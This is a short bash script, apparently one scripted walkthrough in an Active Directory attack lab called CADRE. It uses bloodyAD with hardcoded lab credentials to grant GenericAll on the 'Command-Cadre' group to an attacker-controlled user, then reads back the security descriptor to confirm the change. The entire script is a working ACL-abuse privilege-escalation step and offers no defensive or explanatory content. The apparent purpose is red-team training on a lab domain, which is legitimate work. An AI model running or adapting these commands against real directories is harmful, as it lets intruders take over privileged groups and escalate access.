#!/bin/bash
# CADRE — WT#013 ACL WriteDacl
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#013 — ACL WriteDacl"
start_attack "013" "ACL WriteDacl"

require_tool bloodyAD
require_env DC01 "DC01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"
require_env ATTACK_USER "ATTACK_USER"

step "Step 1: Grant GenericAll (WriteDacl) to attack user on Command-Cadre group"
run_cmd "bloodyAD --host \"$DC01\" -d \"$DOMAIN_ROOT\" -u lead_engineering -p 'Eng_L3ad!' add genericall \"CN=Command-Cadre,OU=Command,DC=cadre,DC=local\" \"$DOMAIN_ROOT\\$ATTACK_USER\""

step "Step 2: Verify the ACL was applied"
run_cmd "bloodyAD --host \"$DC01\" -d \"$DOMAIN_ROOT\" -u lead_engineering -p 'Eng_L3ad!' get object \"CN=Command-Cadre,OU=Command,DC=cadre,DC=local\" --attr nTSecurityDescriptor"

result $? "WriteDacl ACL modified completed"
